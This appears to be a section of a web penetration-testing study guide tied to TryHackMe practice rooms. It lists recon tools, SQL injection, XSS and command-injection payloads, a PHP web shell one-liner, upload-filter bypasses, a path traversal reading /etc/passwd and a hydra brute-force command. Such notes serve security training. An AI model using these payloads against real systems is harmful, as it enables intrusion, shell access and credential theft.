# 4. Web Application Penetration Testing

## 4.1 Web Reconnaissance & Enumeration

**Initial Steps:**
- Visit the site in browser, observe tech stack
- Check source code for comments, JS, hidden inputs
- Use tools like:
  - `whatweb <url>`
  - `wappalyzer` (browser extension)
  - `nikto -h <url>`

**Directory and File Busting:**
- `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt`
- `ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt -t 50`

**Virtual Hosts / DNS:**
- `gobuster vhost -u http://<IP> -w subdomains.txt`
- Check SSL cert for subdomains: `openssl s_client -connect <IP>:443`

**HTTP Methods / Headers:**
- `curl -X OPTIONS http://<IP>`
- `nc <IP> 80` then manually send `OPTIONS / HTTP/1.1`

**TryHackMe practice:**
- [Web Fundamentals](https://tryhackme.com/room/webfundamentals)
- [Web Enumeration](https://tryhackme.com/room/webenumeration)
- [Vulnversity](https://tryhackme.com/room/vulnversity)

## 4.2 Common Web Attack Vectors

**SQL Injection:**
- `' OR 1=1 --` for login bypass
- `id=1' AND 1=1`, `id=1' AND 1=2` for boolean-based SQLi
- Use `sqlmap`:
  - `sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs`

**Cross-Site Scripting (XSS):**
- `<script>alert(1)</script>`  
- `<img src=x onerror=alert(1)>`
- Look for reflected input or stored comment fields

**Command Injection:**
- Input fields that take IPs, hostnames, etc.
- Payload: `8.8.8.8 && whoami`
- Blind: `8.8.8.8 && ping -c 4 <your_IP>`

**File Upload Bypass:**
- Upload `.php` file: `<?php system($_GET['cmd']); ?>`
- Try extensions like `.php.jpg`, `.pHp`, `.php%00.jpg`
- Use intercepted Burp request to tamper content-type or filename

**Directory Traversal:**
- `GET /download?file=../../../../etc/passwd`
- Test for `../` traversal up to root

**TryHackMe practice:**
- [OWASP Top 10](https://tryhackme.com/room/owasptop10)
- [Juice Shop](https://tryhackme.com/room/owaspjuiceshop)
- [DVWA](https://tryhackme.com/room/dvwa)

## 4.3 Web Password Attacks

**Hydra Examples:**
- `hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`

**Default Creds:**
- Always try `admin:admin`, `admin:password`, etc.
- Check `robots.txt`, hidden files, comments for clues

**TryHackMe practice:**
- [Brute It](https://tryhackme.com/room/bruteit)
- [Juice Shop](https://tryhackme.com/room/owaspjuiceshop)
